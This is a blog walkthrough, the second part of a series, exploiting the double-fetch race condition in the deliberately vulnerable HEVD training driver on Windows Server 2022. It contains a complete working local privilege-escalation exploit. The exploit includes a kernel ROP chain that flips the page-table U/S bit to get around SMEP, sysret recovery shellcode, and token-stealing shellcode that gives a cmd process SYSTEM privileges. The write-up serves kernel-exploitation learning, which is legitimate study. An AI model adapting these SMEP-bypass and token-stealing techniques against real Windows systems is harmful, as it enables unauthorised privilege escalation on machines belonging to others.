[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/race)

## HEVD Double-fetch Walkthrough on Windows 2022, Part 2

In part one I managed to win the double-fetch race and get control over the instruction pointer. I was getting a bit sick of waiting for the race condition to trigger so I decided to go back to basics and force the condition. Essentially I would code the exploit like a normal stack overflow. I would send an initial buffer size of `0x800` to pass the first fetch then set a breakpoint in **WinDbg**, when the breakpoint was hit I would change the `r8` register to a size of `0xc00`, the `RtlCopyMemory` call would then overflow the stack:

```
.reload; bp HEVD+0x086911 "r r8 = 0xc00; g"
```

Now I didn't have to wait for the bug to trigger! I could concentrate on the exploit.

## Flipping the U/S Bit

I have used this technique before and you can read about it [hear](https://plackyhacker.github.io/kernel/hevd-2). Essentially, I am flipping the U/S bit in the physical page to make the owner of it become the kernel rather than user space. This plays by SMEP rules and allows the execution of the shellcode there. I used the following ROP chain:

```c
// rop chain
int index = 0;
char* offset = userBuffer + 0x808;
QWORD* rop = (QWORD*)offset;

// now change the user mode page holding Shellcode to kernel owned
*(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
*(rop + index++) = (QWORD)&Shellcode;
*(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress

*(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                // add rsp, 0x28; ret;
                                                // junk
for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                // rax = r8 = Shellcode's PTE address

*(rop + index++) = kernelBase + 0xa0ad41;       // mov r10, rax; mov rax, r10; 
                                                // add rsp, 0x28; ret;
                                                // junk
for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                // rax = r10 = Shellcode's PTE address

*(rop + index++) = kernelBase + 0xa502e6;       // mov rax, qword[rax]; ret;
                                                // rax = Shellcode's PTE value

*(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                // add rsp, 0x28; ret;
                                                // junk
for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                // rax = r8 = Shellcode's PTE value

*(rop + index++) = kernelBase + 0x8571de;       // mov rcx, r8; mov rax, rcx; ret;
                                                // r8 = rcx = rax = Shellcode's PTE value

*(rop + index++) = kernelBase + 0x643308;       // pop rax; ret;
*(rop + index++) = (QWORD)0x4;
*(rop + index++) = kernelBase + 0xa6d474;       // sub rcx, rax; mov rax, rcx; ret;
                                                // rcx = rax = modified PTE value

*(rop + index++) = kernelBase + 0x222d3d;       // mov qword[r10], rax; ret;
                                                // moves the modified PTE value to the PTE address

*(rop + index++) = kernelBase + 0x385a10;       // wbinvd ; ret ;
```

## Returning to User Space

I added the following code to the bottom of the ROP chain:

```c
// ret to user space shellcode
*(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret; 
*(rop + index++) = (QWORD)targetPID;            // the cmd.exe PID
*(rop + index++) = (QWORD)&Shellcode;
```

Notice that I popped a value in to `rcx` as an argument for the shellcode. This is because I spawned another `cmd` process and adjusted the token for this process. I will explain why shortly, but for now just realise that I spawned a new process and my exploit code would steal a SYSTEM token and apply it to this new process.

Including shellcode in a Visual Studio project is pretty easy, ensure that the project dependencies include `masm`, then simply add a `shellcode.asm` file to the project. Include a function like the following:

```
.CODE

Shellcode PROC
	; asm goes in here
Shellcode ENDP
END
```

Then in the main `c` file add the following `extern` statement at the top:

```c
extern "C" void Shellcode(DWORD targetPID);
```

We can now call this function like we would any other function in `c`/`c++`, but of course I included a return to it at the bottom of my ROP chain.

The U/S bit was flipped during the main ROP chain so this code should run fine with SMEP. The shellcode contains nothing at the moment, that's fine. I added something that enabled recovery next.

## Returning to User Mode

This is where it gets a bit messy! I had completely clobbered the stack with my ROP chain so recovering it was gooing to be tricky.

I found an interesting article called [Sysret Shellcode](https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html) by [Kristal-g](https://kristal-g.github.io) which looked interesting. Essentially it uses the **TrapFrame** to recover the context of the thread in user mode as it returns from kernel mode. Here is the shellcode:

```
cleanup:
	mov rax, gs:[0188h]       ; _KPCR.Prcb.CurrentThread
	mov cx, [rax + 01e4h]     ; KTHREAD.KernelApcDisable
	inc cx
	mov [rax + 01e4h], cx
	mov rdx, [rax + 090h]     ; ETHREAD.TrapFrame
	mov rcx, [rdx + 0168h]    ; ETHREAD.TrapFrame.Rip
	mov r11, [rdx + 0178h]    ; ETHREAD.TrapFrame.EFlags
	mov rsp, [rdx + 0180h]    ; ETHREAD.TrapFrame.Rsp
	mov rbp, [rdx + 0158h]    ; ETHREAD.TrapFrame.Rbp
	xor eax, eax  ;
	swapgs
	sysret
```

This blog was written in 2021 and exploited **Windows 10 version 2004 build 19041.685** so I needed to check that the offsets where the same in Windows 2022.

```
1: kd> dt _KTHREAD KernelApcDisable
nt!_KTHREAD
   +0x1e4 KernelApcDisable : Int2B
1: kd> dt _KTHREAD TrapFrame
nt!_KTHREAD
   +0x090 TrapFrame : Ptr64 _KTRAP_FRAME
1: kd> dt _KTRAP_FRAME Rbp, Rip, EFlags, Rsp
nt!_KTRAP_FRAME
   +0x158 Rbp     : Uint8B
   +0x168 Rip     : Uint8B
   +0x178 EFlags  : Uint4B
   +0x180 Rsp     : Uint8B
```

Excellent, they are all the same! One really weird thing about this was that it didn't crash the OS (BSOD), but it also didn't return execution properly back to my exploit. The blog by Kristal-g does say that it might not work with [KVA Shadow](https://msrc.microsoft.com/blog/2018/03/kva-shadow-mitigating-meltdown-on-windows/) which is enabled on my VM.

I had two choices:

- Pivot the stack and recover the registers properly after my exploit concluded.
- Spawn a new `cmd` prompt, record it's PID and pass this to the shellcode.

I opted for the second option in this instance. However, I will probably come back to this at a later date and try to implement the first option as option two seems a bit 'hacky'.

## Token Stealing

Here is the familiar token stealing shellcode:

```
	mov r15, rcx ; move the arg into r15

	start:
	 nop
	 mov    rax, gs:[0188h]
	 mov    rax, [rax+0b8h]
	 mov    r8, rax

	loop1:
	 mov    r8, [r8+0448h]
	 sub    r8, 0448h
	 mov    r9, [r8+0440h]
	 cmp    r9, 04h
	 jne    loop1

	 mov    rcx, [r8+04b8h]
	 and    cl, 0f0h

	 nop

	 mov    rax, gs:[0188h]
	 mov    rax, [rax+0b8h]
	 mov    r8, rax

	loop2:
	 mov    r8, [r8+0448h]
	 sub    r8, 0448h
	 mov    r9, [r8+0440h]
	 cmp    r9, r15
	 jne    loop2

	 nop

	 mov    [r8 + 04b8h], rcx
```

This finds the SYSTEM process, records the token from it, then finds the PID of the process I spawned and replaces it's token with the SYSTEM token.

## Putting it Together

This all works and it eventually gives us a SYSTEM shell in the spawned `cmd` process:

```
C:\Users\John>whoami
NT AUTHORITY\SYSTEM
```

The main problem is we have a newly spawned process waiting to receive a privileged token, which is fine but we do not know when the race condition has been won. So, although I can gain local privilege escalation from this I'm not completely happy with the execution and I will definitely be revisiting this. I've seen lots of exploits online for this bug, but they all seem to be for Windows 7, without SMEP.

I set out with the objective of learning how to exploit the double-fetch in HEVD, which I met, I am not fully satisfied! I will return!

## Final Exploit

Here's the final exploit code:

```c
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <cstdint>

extern "C" void Shellcode(DWORD targetPID);

struct UserData {
    LPVOID pBuffer;
    size_t sizeOfData;
};

// global variables
UserData userData;
char* userBuffer;
HANDLE hDriver;

// used to stop the while loop
BOOL raceWon = FALSE;

// this is the function trying to win the race
DWORD WINAPI ChangeStruct(void* args)
{
    //printf("[+] Changing struct...\n");
    for (int i = 1; i < 50; i++)
    {
        userData.sizeOfData = 0xc00;
    }
    return NULL;
}

// this is the function sending the initial IOCTL
DWORD WINAPI SendIOCTL(void* args)
{
    //printf("[+] Sending IOCTL...\n");
    userData.pBuffer = userBuffer;
    userData.sizeOfData = 0x800;
    BOOL status = DeviceIoControl(hDriver,
        0x222037, (LPVOID)&userData, sizeof(userData), NULL, 0, NULL, NULL);

    //printf("[!] status=%d, size=0x%X\n", status, userData.sizeOfData);

    return NULL;
}

DWORD WINAPI StartCommand(void* args)
{
    Sleep(5000);
    system("start cmd.exe");
    return NULL;
}

typedef uint64_t QWORD;
#define ARRAY_SIZE 1024
#define BUFFER_SIZE 0x810

QWORD getBaseAddr(LPCWSTR drvName) {
    LPVOID drivers[512];
    DWORD cbNeeded;
    int nDrivers, i = 0;
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers)) {
        WCHAR szDrivers[512];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++) {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0]))) {
                if (wcscmp(szDrivers, drvName) == 0) {
                    return (QWORD)drivers[i];
                }
            }
        }
    }
    return 0;
}


int main() {
    printf("HEVD Double Fetch Exploit\n=========================\n");

    // get a handle to the driver
    hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
        return 1;
    }

    // spawning a new cmd shell
    STARTUPINFOA structStartupInfo = { 0 };
    PROCESS_INFORMATION structProcInfo = { 0 };

    structStartupInfo.cb = sizeof(structStartupInfo);

    printf("[+] Starting a new cmd.exe process...\n");
    CreateProcessA("c:\\windows\\system32\\cmd.exe", 
        0, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, 0, 0, &structStartupInfo, &structProcInfo);

    DWORD targetPID = structProcInfo.dwProcessId;
    printf("[+] cmd.exe PID: %d\n", targetPID);

    // allocate the user space buffer
    printf("[+] Allocating memory for user buffer...\n");
    userBuffer = (char*)malloc(sizeof(char*) * BUFFER_SIZE);
    memset((void*)userBuffer, 0x00, BUFFER_SIZE);
    printf("[+] userBuffer: 0x%p\n", userBuffer);

    // get the kernel base address
    QWORD kernelBase = getBaseAddr(L"ntoskrnl.exe");
    printf("[+] Kernel base address: 0x%p\n", kernelBase);

    QWORD hevdBase = getBaseAddr(L"HEVD.sys");
    printf("[+] HEVD base address: 0x%p\n", hevdBase);

    // ROP Gadgets
    QWORD ROP_NOP = kernelBase + 0x639131;                          // ret ;
    QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret

    // marker
    char marker[] = "wootwoot";
    memcpy((void*)(userBuffer + 0x800), marker, 0x8);

    // rop chain
    int index = 0;
    char* offset = userBuffer + 0x808;
    QWORD* rop = (QWORD*)offset;

    // debug break
    //*(rop + index++) = INT3;
    //*(rop + index++) = hevdBase

    // we should set the raceWon variable to 1
    *(rop + index++) = kernelBase + 0x643308;       // pop rax; ret;
    *(rop + index++) = (QWORD)&raceWon;             // the variable address
    *(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret; 
    *(rop + index++) = (QWORD)0x01;                 // TRUE
    *(rop + index++) = kernelBase + 0x30a014;       // mov qword[rax], rcx; ret;

    // now change the user mode page holding Shellcode to kernel owned
    *(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
    *(rop + index++) = (QWORD)&Shellcode;
    *(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress

    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                    // add rsp, 0x28; ret;
                                                    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r8 = Shellcode's PTE address

    *(rop + index++) = kernelBase + 0xa0ad41;       // mov r10, rax; mov rax, r10; 
                                                    // add rsp, 0x28; ret;
                                                    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r10 = Shellcode's PTE address

    *(rop + index++) = kernelBase + 0xa502e6;       // mov rax, qword[rax]; ret;
                                                    // rax = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
                                                    // add rsp, 0x28; ret;
                                                    // junk
    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
                                                    // rax = r8 = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x8571de;       // mov rcx, r8; mov rax, rcx; ret;
                                                    // r8 = rcx = rax = Shellcode's PTE value

    *(rop + index++) = kernelBase + 0x643308;       // pop rax; ret;
    *(rop + index++) = (QWORD)0x4;
    *(rop + index++) = kernelBase + 0xa6d474;       // sub rcx, rax; mov rax, rcx; ret;
                                                    // rcx = rax = modified PTE value

    *(rop + index++) = kernelBase + 0x222d3d;       // mov qword[r10], rax; ret;
                                                    // moves the modified PTE value to the PTE address

    *(rop + index++) = kernelBase + 0x385a10;       // wbinvd ; ret ;

    // ret to user space shellcode
    *(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret; 
    *(rop + index++) = (QWORD)targetPID;            // the cmd.exe PID
    *(rop + index++) = (QWORD)&Shellcode;

    printf("[+] Address of SendIOCTL: 0x%p\n", &SendIOCTL);
    printf("[!] Press enter to continue...");
    getchar();

    printf("[+] Starting the race, this may take some time...\n");
    
    while(!raceWon)
    {
        HANDLE handles[2] = { 0 };

        // send the initial IOCTL
        HANDLE tIOCTL = CreateThread(NULL,
            NULL, SendIOCTL, NULL, CREATE_SUSPENDED, NULL);

        // try to win the race
        HANDLE tChangeStruct = CreateThread(NULL,
            NULL, ChangeStruct, NULL, CREATE_SUSPENDED, NULL);

        handles[0] = tIOCTL;
        handles[1] = tChangeStruct;

        // make both threads critical
        SetThreadPriority(tChangeStruct, THREAD_PRIORITY_TIME_CRITICAL);
        SetThreadPriority(tIOCTL, THREAD_PRIORITY_TIME_CRITICAL);

        SetThreadAffinityMask(tIOCTL, 1);
        SetThreadAffinityMask(tChangeStruct, 0);

        ResumeThread(tChangeStruct);
        ResumeThread(tIOCTL);

        // wait for threads
        WaitForMultipleObjects(2, handles, true, INFINITE);
    }

    return 0;
}
```

That is all for now, go away!

[Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/race)
